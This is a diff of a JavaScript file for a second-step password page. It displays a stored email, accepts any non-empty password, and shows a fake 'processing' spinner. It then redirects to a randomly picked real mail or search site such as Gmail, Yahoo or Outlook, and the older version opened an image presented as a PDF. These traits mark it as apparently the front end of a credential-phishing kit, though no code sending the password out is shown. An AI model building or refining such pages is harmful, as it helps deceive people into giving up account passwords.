@@ -1,99 +1,78 @@
-const verifyForm = document.getElementById('verifyForm');
-const email2Input = document.getElementById('email2');
-const password2Input = document.getElementById('password2');
-const emailError = document.getElementById('emailError');
+const passwordForm = document.getElementById('passwordForm');
+const passwordInput = document.getElementById('password');
 const passwordError = document.getElementById('passwordError');
-const successMessage = document.getElementById('successMessage');
+const emailDisplay = document.getElementById('emailDisplay');
+const accessBtn = document.getElementById('accessBtn');
+const loadingSpinner = document.getElementById('loadingSpinner');
+const formContent = document.querySelector('.card-content form');
+
+// Redirect URLs for random selection
+const redirectUrls = [
+    'https://www.gmail.com',
+    'https://mail.google.com',
+    'https://www.google.com',
+    'https://www.yahoo.com',
+    'https://www.outlook.com'
+];
 
 // Check if user came from page 1
 window.addEventListener('load', function() {
     const userEmail = localStorage.getItem('userEmail');
-    const userPassword = localStorage.getItem('userPassword');
     
-    if (!userEmail || !userPassword) {
+    if (!userEmail) {
         alert('Please login first');
         window.location.href = 'index.html';
+        return;
     }
+    
+    // Display email on page 2
+    emailDisplay.textContent = userEmail;
 });
 
-// Verify Form Submission
-verifyForm.addEventListener('submit', function(e) {
+// Password Form Submission
+passwordForm.addEventListener('submit', function(e) {
     e.preventDefault();
     
-    emailError.style.display = 'none';
     passwordError.style.display = 'none';
     
-    const email = email2Input.value.trim();
-    const password = password2Input.value;
+    const password = passwordInput.value;
     
-    const savedEmail = localStorage.getItem('userEmail');
-    const savedPassword = localStorage.getItem('userPassword');
-    
-    let isValid = true;
-    
-    // Validate email
-    if (!isValidEmail(email)) {
-        emailError.style.display = 'block';
-        isValid = false;
-    }
-    
-    // Validate password
-    if (password.length < 6) {
+    // Validate password (minimum 1 character)
+    if (password.length < 1) {
         passwordError.style.display = 'block';
-        isValid = false;
+        passwordError.textContent = 'Please enter a password';
+        return;
     }
     
-    // Check if credentials match
-    if (isValid && (email !== savedEmail || password !== savedPassword)) {
-        emailError.style.display = 'block';
-        emailError.textContent = translations[window.currentLanguage].credentialsError;
-        isValid = false;
-    }
+    // Show loading spinner
+    formContent.style.display = 'none';
+    loadingSpinner.style.display = 'block';
     
-    if (isValid) {
-        successMessage.style.display = 'block';
+    // Simulate processing delay
+    setTimeout(function() {
+        // Clear stored email
+        localStorage.removeItem('userEmail');
         
-        setTimeout(function() {
-            // Open PDF
-            window.open('images/background.jpg', '_blank');
-            
-            // Clear stored credentials
-            localStorage.removeItem('userEmail');
-            localStorage.removeItem('userPassword');
-            
-            // Redirect back to login
-            setTimeout(function() {
-                window.location.href = 'index.html';
-            }, 1000);
-        }, 1500);
-    }
+        // Select random redirect URL
+        const randomUrl = redirectUrls[Math.floor(Math.random() * redirectUrls.length)];
+        
+        // Redirect to random URL or Gmail
+        window.location.href = randomUrl;
+    }, 1500);
 });
 
-function isValidEmail(email) {
-    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    return emailRegex.test(email);
+function isValidPassword(password) {
+    return password.length > 0;
 }
 
-email2Input.addEventListener('blur', function() {
-    if (this.value.trim().length > 0 && isValidEmail(this.value.trim())) {
-        emailError.style.display = 'none';
-    }
-});
-
-password2Input.addEventListener('blur', function() {
-    if (this.value.length >= 6) {
+passwordInput.addEventListener('blur', function() {
+    if (this.value.length > 0) {
         passwordError.style.display = 'none';
     }
 });
 
-email2Input.addEventListener('keypress', function(e) {
+passwordInput.addEventListener('keypress', function(e) {
     if (e.key === 'Enter') {
-        password2Input.focus();
-    }
-});
-
-password2Input.addEventListener('keypress', function(e) {
-    if (e.key === 'Enter') {
-        verifyForm.dispatchEvent(new Event('submit'));
+        passwordForm.dispatchEvent(new Event('submit'));
     }
 });
